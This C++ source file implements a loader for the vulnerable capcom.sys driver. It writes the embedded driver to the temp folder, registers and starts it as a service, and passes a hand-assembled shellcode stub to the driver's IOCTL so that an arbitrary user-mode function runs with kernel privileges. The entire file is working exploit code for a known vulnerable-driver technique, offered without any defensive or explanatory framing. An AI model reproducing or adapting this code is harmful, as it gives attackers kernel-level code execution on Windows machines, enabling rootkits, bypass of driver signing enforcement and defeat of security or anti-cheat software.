#include "includes.hpp"

bool CapcomControl::ExecuteUserFunction(void* p_func, void* p_param)
{
    if (!p_func || !device_handle)
    { 
        return false;
    }

    BYTE* payload_ptr = nullptr;

    if (p_param)
    {
        BYTE payload_template[] =
        {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, p_param
            0x58,                                                       // POP RAX
            0xFF, 0x20                                                  // JMP [RAX]
        };

        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!payload_ptr)
        {
            LOG("[-] VirtualAlloc error %d", GetLastError());

            return false;
        }
        
        ZeroMemory(payload_ptr, sizeof(payload_template));
        memcpy(payload_ptr, payload_template, sizeof(payload_template));

        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func;
        *(DWORD64*)(payload_ptr + 23) = (DWORD64)p_param;
    }
    else
    {
        BYTE payload_template[] =
        {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
            0x58,                                                       // POP RAX
            0xFF, 0x20                                                  // JMP [RAX]
        };

        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!payload_ptr)
        {
            LOG("[-] VirtualAlloc error %d", GetLastError());

            return false;
        }

        ZeroMemory(payload_ptr, sizeof(payload_template));
        memcpy(payload_ptr, payload_template, sizeof(payload_template));

        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func;
    }

    DWORD output_buf;
    DWORD bytes_returned;

    BYTE* target = payload_ptr + sizeof(void*);

    if (!DeviceIoControl(device_handle, CAPCOM_IOCTL, &target, CAPCOM_INPUT_BUF_SIZE, &output_buf, CAPCOM_OUTPUT_BUF_SIZE, &bytes_returned, nullptr))
    {
        LOG("[-] DeviceIoControl error %d", GetLastError());

        VirtualFree(payload_ptr, 0, MEM_RELEASE);

        return false;
    }

    VirtualFree(payload_ptr, 0, MEM_RELEASE);

    return true;
}

bool CapcomControl::Load()
{
    LOG("[>] Loading capcom.sys");

    wchar_t temp_path[MAX_PATH] = { 0 };

    if (!GetTempPathW(MAX_PATH, temp_path))
    {
        LOG("[-] GetTempPathW error: %d", GetLastError());

        return false;
    }

    std::filesystem::path path_to_driver(temp_path);

    path_to_driver += driver_name;

    if (!tools::CreateFileFromMemory(path_to_driver, capcom_binary, CAPCOM_SYS_LEN))
    {
        LOG("[-] Can't create capcom.sys file from memory.");

        return false;
    }

    driver_temp_path = path_to_driver;

    if (!service::RegisterAndStart(path_to_driver))
    {
        LOG("[-] Can't register and start service.");

        std::filesystem::remove(path_to_driver);

        return false;
    }

    HANDLE device_handle = CreateFile(device_name.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (device_handle != INVALID_HANDLE_VALUE)
    {
        this->device_handle = device_handle;

        return true;
    }

    std::filesystem::remove(path_to_driver);

    return false;
}

bool CapcomControl::Unload()
{
    LOG("[>] Unloading capcom.sys");

    std::filesystem::path _driver_name(driver_name);

    CloseHandle(device_handle);

    if (!service::UnregisterAndStop(_driver_name))
    {
        LOG("[-] Can't unregister and stop capcom.sys, error %d", GetLastError());

        return false;
    }

    try
    {
        return std::filesystem::remove(driver_temp_path);
    }
    catch (std::exception& ex)
    {
        LOG("%s", ex.what());

        return false;
    }
}
